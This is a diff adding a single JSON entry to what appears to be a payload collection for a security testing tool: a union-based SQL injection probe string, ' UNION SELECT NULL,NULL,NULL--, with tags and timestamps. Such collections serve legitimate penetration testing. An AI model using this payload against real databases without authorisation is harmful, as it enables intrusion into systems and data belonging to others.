@@ -1,0 +1,14 @@
+{
+  "id": "payload-1770491012549-o6g0dgruq",
+  "name": "SQL Union Select",
+  "category": "sqli",
+  "payload": "' UNION SELECT NULL,NULL,NULL--",
+  "description": "Union-based SQL injection probe",
+  "tags": [
+    "union",
+    "probe"
+  ],
+  "usageCount": 0,
+  "createdAt": "2026-02-07T19:03:32.549Z",
+  "updatedAt": "2026-02-07T19:03:32.549Z"
+}
